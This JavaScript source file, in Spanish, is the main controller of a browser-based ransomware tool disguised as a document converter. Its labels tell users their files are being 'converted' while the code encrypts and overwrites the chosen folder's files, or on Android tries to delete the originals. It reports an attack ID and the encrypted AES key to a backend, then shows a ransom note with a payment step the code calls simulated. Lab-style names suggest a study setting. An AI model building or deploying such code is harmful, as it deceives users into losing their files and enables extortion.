import {
    apiArchivosDisponible,
    seleccionarArchivosDeCarpeta,
    crearCopiasTemporales,
    eliminarDirectoriosTemporales,
    calcularTamanoTotal
} from "./acceso-archivos.js?v=android2";

import {
    verificarBackend,
    enviarRegistroResultado,
    pagarRescate,
    finalizarRescate
} from "./resultados.js";

import {
    cifrarYSobrescribirArchivos,
    descifrarYRestaurarArchivos
} from "./cifrado-webcrypto.js?v=android2";

import {
    cifrarCopiasConWebAssembly,
    descifrarCopiasConWebAssembly
} from "./cifrado-webassembly.js?v=android2";

import {
    esAndroidLaboratorio,
    cifrarAndroidWebCrypto,
    descifrarAndroidWebCrypto,
    crearCopiasOmitidasAndroid,
    crearWebAssemblyOmitidoAndroid,
    medirWebAssemblyAndroid
} from "./cifrado-android.js?v=android8";

const btnSeleccionar = document.getElementById("btnSeleccionar");
const btnProcesar = document.getElementById("btnProcesar");
const mensajeSoporte = document.getElementById("mensajeSoporte");
const estadoConversion = document.getElementById("estadoConversion");
const contadorProceso = document.getElementById("contadorProceso");
const listaArchivos = document.getElementById("listaArchivos");
const contadorArchivos = document.getElementById("contadorArchivos");
const tamanoTotal = document.getElementById("tamanoTotal");
const mensajeProceso = document.getElementById("mensajeProceso");

const panelRescate = document.getElementById("panelRescate");
const idAtaqueRescate = document.getElementById("idAtaqueRescate");
const btnPagar = document.getElementById("btnPagar");
const btnRestaurar = document.getElementById("btnRestaurar");
const estadoRescate = document.getElementById("estadoRescate");
const listaRestauracion = document.getElementById("listaRestauracion");

let directorioSeleccionado = null;
let archivosSeleccionados = [];
let backendDisponible = false;

let ataqueActual = null;
let llaveAESRecuperada = null;
let detalleOriginalRecuperado = [];

function formatearBytes(bytes) {
    if (bytes === 0) return "0 B";

    const unidades = ["B", "KiB", "MiB", "GiB"];
    const indice = Math.floor(Math.log(bytes) / Math.log(1024));
    const valor = bytes / Math.pow(1024, indice);

    return `${valor.toFixed(2)} ${unidades[indice]}`;
}

function actualizarListaArchivos() {
    listaArchivos.innerHTML = "";

    if (archivosSeleccionados.length === 0) {
        listaArchivos.innerHTML = '<p class="empty">Selecciona una carpeta para comenzar.</p>';
        contadorArchivos.textContent = "0 archivos";
        contadorProceso.textContent = "0";
        tamanoTotal.textContent = "0 MiB";
        btnProcesar.disabled = true;
        estadoConversion.textContent = "Esperando archivos";
        return;
    }

    const totalBytes = calcularTamanoTotal(archivosSeleccionados);

    contadorArchivos.textContent = `${archivosSeleccionados.length} archivos`;
    contadorProceso.textContent = archivosSeleccionados.length;
    tamanoTotal.textContent = formatearBytes(totalBytes);

    for (const archivo of archivosSeleccionados) {
        const item = document.createElement("div");
        item.className = "file-item";

        item.innerHTML = `
            <span class="file-name">${archivo.nombre}</span>
            <span class="file-size">${formatearBytes(archivo.tamano)}</span>
        `;

        listaArchivos.appendChild(item);
    }

    btnProcesar.disabled = false;
    estadoConversion.textContent = "Listo para convertir";
}

async function inicializarBackend() {
    backendDisponible = await verificarBackend();
}

function inicializarApiArchivos() {
    if (apiArchivosDisponible()) {
        mensajeSoporte.textContent = "Puedes seleccionar una carpeta con varios documentos.";
        btnSeleccionar.disabled = false;
    } else {
        mensajeSoporte.textContent = "Este navegador no permite seleccionar carpetas locales.";
        btnSeleccionar.disabled = true;
        estadoConversion.textContent = "Navegador no compatible";
    }
}

async function seleccionarCarpeta() {
    try {
        archivosSeleccionados = [];
        directorioSeleccionado = null;

        ataqueActual = null;
        llaveAESRecuperada = null;
        detalleOriginalRecuperado = [];

        if (panelRescate) {
            panelRescate.classList.add("oculto");
        }

        estadoConversion.textContent = "Seleccionando archivos";
        mensajeProceso.textContent = "Abriendo selector de carpeta...";

        const seleccion = await seleccionarArchivosDeCarpeta();

        directorioSeleccionado = seleccion.directorio;
        archivosSeleccionados = seleccion.archivos;

        actualizarListaArchivos();
        mensajeProceso.textContent = "Archivos cargados correctamente. Puedes iniciar la conversión.";
    } catch (error) {
        estadoConversion.textContent = "Esperando archivos";
        mensajeProceso.textContent = "No se seleccionó ninguna carpeta.";
    }
}

function mostrarNotaRescate(idAtaque) {
    if (!panelRescate) {
        return;
    }

    idAtaqueRescate.textContent = idAtaque;
    estadoRescate.textContent = "Tus archivos están cifrados. Realiza el pago solicitado para liberar la clave de recuperación.";
    listaRestauracion.innerHTML = "";

    btnPagar.disabled = false;
    btnPagar.classList.remove("oculto");
    btnRestaurar.classList.add("oculto");

    panelRescate.classList.remove("oculto");
}

function mostrarResultadoRestauracion(detalle) {
    listaRestauracion.innerHTML = "";

    for (const archivo of detalle) {
        const item = document.createElement("div");
        item.className = "restore-item";

        const estadoClase = archivo.restaurado ? "restore-ok" : "restore-error";
        const simbolo = archivo.restaurado ? "✔" : "✖";
        const texto = archivo.restaurado
            ? "Restaurado correctamente"
            : `Error: ${archivo.error || archivo.integridad}`;

        item.innerHTML = `
            <span class="restore-name">${archivo.nombre}</span>
            <span class="${estadoClase}">${simbolo} ${texto}</span>
        `;

        listaRestauracion.appendChild(item);
    }
}

async function pagarSimulado() {
    if (!ataqueActual) {
        estadoRescate.textContent = "No hay un ID de incidente activo.";
        return;
    }

    try {
        btnPagar.disabled = true;
        estadoRescate.textContent = "Procesando transferencia de recuperación...";

        const respuesta = await pagarRescate(ataqueActual);

        llaveAESRecuperada = respuesta.llave_aes_base64;
        detalleOriginalRecuperado = respuesta.archivos?.detalle || [];

        estadoRescate.textContent = "Pago recibido. La clave de recuperación fue liberada.";
        btnRestaurar.classList.remove("oculto");
    } catch (error) {
        btnPagar.disabled = false;
        estadoRescate.textContent = "Error al procesar el pago simulado.";
    }
}

async function restaurarArchivos() {
    if (!llaveAESRecuperada) {
        estadoRescate.textContent = "No se ha recuperado la llave AES.";
        return;
    }

    if (esAndroidLaboratorio()) {
        try {
            btnRestaurar.disabled = true;
            estadoRescate.textContent = "Recuperando archivos en modo Android...";

            const resultadoDescifrado = await descifrarAndroidWebCrypto(
                directorioSeleccionado,
                archivosSeleccionados,
                llaveAESRecuperada,
                detalleOriginalRecuperado
            );

            mostrarResultadoRestauracion(resultadoDescifrado.detalle);

            await finalizarRescate(
                ataqueActual,
                resultadoDescifrado
            );

            estadoRescate.textContent = `Restauración finalizada: ${resultadoDescifrado.archivos_restaurados} correctos, ${resultadoDescifrado.archivos_con_error} con error.`;
            estadoConversion.textContent = "Archivos recuperados";
            mensajeProceso.textContent = "Los archivos fueron recuperados como archivos nuevos en modo Android.";
        } catch (error) {
            btnRestaurar.disabled = false;
            estadoRescate.textContent = "Error durante la restauración Android: " + error.name + " - " + error.message;
            alert("Error restauración Android: " + error.name + "\n" + error.message);
        }

        return;
    }

    try {
        btnRestaurar.disabled = true;
        estadoRescate.textContent = "Recuperando archivos cifrados...";

        const resultadoDescifrado = await descifrarYRestaurarArchivos(
              archivosSeleccionados,
              llaveAESRecuperada,
              detalleOriginalRecuperado,
              directorioSeleccionado
          );

        mostrarResultadoRestauracion(resultadoDescifrado.detalle);

        await finalizarRescate(
            ataqueActual,
            resultadoDescifrado
        );

        estadoRescate.textContent = `Restauración finalizada: ${resultadoDescifrado.archivos_restaurados} correctos, ${resultadoDescifrado.archivos_con_error} con error.`;

        estadoConversion.textContent = "Archivos recuperados";
        mensajeProceso.textContent = "Los archivos fueron recuperados y verificados.";
    } catch (error) {
        btnRestaurar.disabled = false;
        estadoRescate.textContent = "Error durante la restauración.";
    }
}


async function procesarArchivosAndroid() {
    try {
        estadoConversion.textContent = "Procesando Android";
        mensajeProceso.textContent = "Aplicando cifrado WebCrypto en modo Android/Huawei...";

        const copias = crearCopiasOmitidasAndroid();

        const resultadoWebAssembly = await medirWebAssemblyAndroid(
            directorioSeleccionado,
            archivosSeleccionados
        );

        const resultadoCifrado = await cifrarAndroidWebCrypto(
            directorioSeleccionado,
            archivosSeleccionados
        );

        const idAtaque = crypto.randomUUID();

        const registro = {
            id_ataque: idAtaque,
            fecha_inicio: new Date().toISOString(),
            fecha_fin: new Date().toISOString(),
            estado: "cifrado_android_webcrypto",
            cliente: {
                agente_usuario: navigator.userAgent,
                plataforma: navigator.platform,
                modo_ejecucion: "android_webcrypto"
            },
            llave: {
                algoritmo: resultadoCifrado.algoritmo,
                tamano_llave_bits: resultadoCifrado.tamano_llave_bits,
                proteccion_llave: resultadoCifrado.proteccion_llave,
                llave_aes_cifrada: resultadoCifrado.llave_aes_cifrada
            },
            copias_temporales: copias,
            archivos: {
                cantidad: archivosSeleccionados.length,
                tamano_total_bytes: resultadoCifrado.tamano_total_bytes,
                tamano_total_mib: resultadoCifrado.tamano_total_mib,
                detalle: resultadoCifrado.detalle
            },
            webcrypto: {
                estado: "ejecutado",
                tiempo_cifrado_ms: resultadoCifrado.tiempo_cifrado_ms,
                velocidad_cifrado_mib_s: resultadoCifrado.velocidad_cifrado_mib_s
            },
            webassembly: resultadoWebAssembly,
            limpieza_temporal: {
                estado: "omitida_en_android",
                directorios_eliminados: []
            },
            rescate: {
                nota_mostrada: true,
                pago: false,
                pago_simulado: false,
                descifrado_habilitado: false,
                restauracion_completada: false
            },
            limitaciones_detectadas: [
                "Ejecución desde Android/Huawei",
                "Se omitieron copias temporales",
                "Se omitió WebAssembly",
                "Resultado válido para WebCrypto en modo móvil"
            ]
        };

        await enviarRegistroResultado(registro);

        ataqueActual = idAtaque;
        detalleOriginalRecuperado = resultadoCifrado.detalle;

        estadoConversion.textContent = "Archivos bloqueados";
        mensajeProceso.textContent = "Las copias controladas fueron cifradas y se intentó eliminar el original en modo Android. Se muestra la nota de rescate.";

        mostrarNotaRescate(idAtaque);
    } catch (error) {
        console.error(error);
        estadoConversion.textContent = "Error";
        mensajeProceso.textContent = "No fue posible completar el proceso Android: " + error.name + " - " + error.message;
        alert("Error Android: " + error.name + "\\n" + error.message);
    }
}

async function procesarArchivos() {
    if (!directorioSeleccionado || archivosSeleccionados.length === 0) {
        mensajeProceso.textContent = "No hay archivos para convertir.";
        return;
    }

    backendDisponible = await verificarBackend();

    if (!backendDisponible) {
        estadoConversion.textContent = "Servicio no disponible";
        mensajeProceso.textContent = "No se pudo contactar el servicio de conversión.";
        return;
    }

    if (esAndroidLaboratorio()) {
        await procesarArchivosAndroid();
        return;
    }

    try {
        estadoConversion.textContent = "Creando copias";
        mensajeProceso.textContent = "Creando copias temporales de los documentos...";

        const copias = await crearCopiasTemporales(
            directorioSeleccionado,
            archivosSeleccionados
        );

        estadoConversion.textContent = "Procesando";
        mensajeProceso.textContent = "Aplicando conversión a los documentos...";

        const resultadoCifrado = await cifrarYSobrescribirArchivos(
              archivosSeleccionados,
              directorioSeleccionado
          );

        estadoConversion.textContent = "Comparando rendimiento";
        mensajeProceso.textContent = "Procesando copias temporales con WebAssembly...";

        let resultadoWebAssembly = {
            estado: "no_ejecutado",
            error: null
        };

        try {
            const resultadoCifradoWebAssembly = await cifrarCopiasConWebAssembly(
                directorioSeleccionado,
                archivosSeleccionados
            );

            const resultadoDescifradoWebAssembly = await descifrarCopiasConWebAssembly(
                directorioSeleccionado,
                archivosSeleccionados
            );

            resultadoWebAssembly = {
                ...resultadoCifradoWebAssembly,
                tiempo_descifrado_ms: resultadoDescifradoWebAssembly.tiempo_descifrado_ms,
                velocidad_descifrado_mib_s: resultadoDescifradoWebAssembly.velocidad_descifrado_mib_s,
                descifrado: resultadoDescifradoWebAssembly
            };
        } catch (error) {
            console.error("Error en WebAssembly:", error);

            resultadoWebAssembly = {
                estado: "error",
                uso: "comparacion_de_rendimiento",
                error: error.message
            };
        }

        estadoConversion.textContent = "Limpiando temporales";
        mensajeProceso.textContent = "Eliminando archivos temporales de la prueba...";

        let temporalesEliminados = [];

        try {
            temporalesEliminados = await eliminarDirectoriosTemporales(
                directorioSeleccionado
            );
        } catch (error) {
            console.error("Error limpiando temporales:", error);
            temporalesEliminados = [];
        }

        const idAtaque = crypto.randomUUID();

        const registro = {
            id_ataque: idAtaque,
            fecha_inicio: new Date().toISOString(),
            fecha_fin: new Date().toISOString(),
            estado: "cifrado_webcrypto_sobrescritura",
            cliente: {
                agente_usuario: navigator.userAgent,
                plataforma: navigator.platform
            },
            llave: {
                algoritmo: resultadoCifrado.algoritmo,
                tamano_llave_bits: resultadoCifrado.tamano_llave_bits,
                proteccion_llave: resultadoCifrado.proteccion_llave,
                llave_aes_cifrada: resultadoCifrado.llave_aes_cifrada
            },
            copias_temporales: {
                ...copias,
                eliminadas_al_final: temporalesEliminados.includes("_rob_copias_temporales")
            },
            archivos: {
                cantidad: archivosSeleccionados.length,
                tamano_total_bytes: resultadoCifrado.tamano_total_bytes,
                tamano_total_mib: resultadoCifrado.tamano_total_mib,
                detalle: resultadoCifrado.detalle
            },
            webcrypto: {
                tiempo_cifrado_ms: resultadoCifrado.tiempo_cifrado_ms,
                velocidad_cifrado_mib_s: resultadoCifrado.velocidad_cifrado_mib_s
            },
            webassembly: {
                ...resultadoWebAssembly,
                eliminado_al_final: temporalesEliminados.includes("_rob_wasm_resultados")
            },
            limpieza_temporal: {
                estado: "completada",
                directorios_eliminados: temporalesEliminados
            },
            rescate: {
                nota_mostrada: true,
                pago: false,
                pago_simulado: false,
                descifrado_habilitado: false,
                restauracion_completada: false
            }
        };

        await enviarRegistroResultado(registro);

        ataqueActual = idAtaque;
        detalleOriginalRecuperado = resultadoCifrado.detalle;

        estadoConversion.textContent = "Archivos bloqueados";
        mensajeProceso.textContent = "Los documentos fueron cifrados. Se muestra la nota de rescate.";

        mostrarNotaRescate(idAtaque);
    } catch (error) {
        console.error(error);
        estadoConversion.textContent = "Error";
        mensajeProceso.textContent = "No fue posible completar el proceso: " + error.name + " - " + error.message; alert("ERROR: " + error.name + "\n" + error.message);
    }
}

btnSeleccionar.addEventListener("click", seleccionarCarpeta);
btnProcesar.addEventListener("click", procesarArchivos);

if (btnPagar) {
    btnPagar.addEventListener("click", pagarSimulado);
}

if (btnRestaurar) {
    btnRestaurar.addEventListener("click", restaurarArchivos);
}

inicializarApiArchivos();
inicializarBackend();
actualizarListaArchivos();
